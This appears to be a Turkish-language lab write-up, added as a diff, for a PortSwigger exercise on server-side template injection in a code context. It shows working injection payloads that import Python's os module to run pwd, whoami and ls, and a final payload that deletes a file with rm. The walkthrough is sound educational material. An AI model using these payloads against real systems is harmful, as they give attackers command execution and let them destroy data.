@@ -1,0 +1,49 @@
+Lab: Basic server-side template injection (code context)
+url: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
+
+
+Amaç: 
+Morale.txt dosyasını silmek.
+
+Analiz 1:
+        -- Sitede kullanıcı adının nasıl görünmesini seçtiğimiz bir alanda şablon kullanılmış
+        
+        -- Şablon isteğini yakalayınca manzara şu şekildeydi
+        " blog-post-author-display=user.first_name&csrf=y4tkyUSEZR0SzSRHsxxkcggjqKS7bRNB "
+        
+        -- Buraya komut gömersek ve daha sonrasında bu etkiyi nerede alacağımızı anlarsak soru çözülecektir.
+        
+        -- Yaptığımız tercihler yorum yaptığımızda kullanıcı adı olarak görünüyordu . Yani komutlarımızın
+        o noktada karşılığı olacak.
+        
+        -- Birkaç şablon keşfi denemesinden sonra bize }}{{...}} tazrında bir kalıpla komut yükleme imkanı sağladığını anlaşılıyor
+        }}{{7*7}} sonucu 49 döndü ve yolu doğruladık.
+
+Analiz 2:       
+        -- Bu boşlukta komut yürütebiliriz ama amacımız işletim sisteminde dosya yönetimini ele geçirmek
+        bu yüzden gerekli python kütüphanesini import etmeliyiz
+
+        -- Bu noktada https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html adresindende
+        teyit edebileceğiniz üzere {%...%} (Statement / Logic) kalıbını kullanmalıyız
+       
+BİLGİ---------------------------------------------------------------------------------------------------------------------
+    {{....}} bu yapı ekrana yazdırma yani Expression için kullnılırken
+    {%...%} bu yapı arka planda bir işlem yapmak için kullanılır yani Statement / Logic işlemler
+--------------------------------------------------------------------------------------------------------------------------
+
+        -- Sırada sızma aşamasında tarama yapmakta
+            -Neredeyim ?
+            -Kimim ?
+            -Aradığım şey nerde?
+        bu soruların cevabını aldıktan sonra yola devam edeceğiz.
+
+        Neredeyim sorusunun cevabı ---> blog-post-author-display=user.first_name}}{% import os %}{{os.system('pwd')}}
+        Kimim sorunun cevabı ---> blog-post-author-display=user.first_name}}{% import os %}{{os.system('whoami')}}
+        Aradığım şey nerde ---> blog-post-author-display=user.first_name}}{% import os %}{{os.system('ls')}}
+
+        bu cevaplardan sonra silmek için dopru dizinde ve kişi olduğumuzu anlıyoruz .
+
+        Nihai Payload:
+
+        blog-post-author-display=user.first_name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
+        komutu ile klasörü siliyoruz ve lab tamamlanıyor. xd
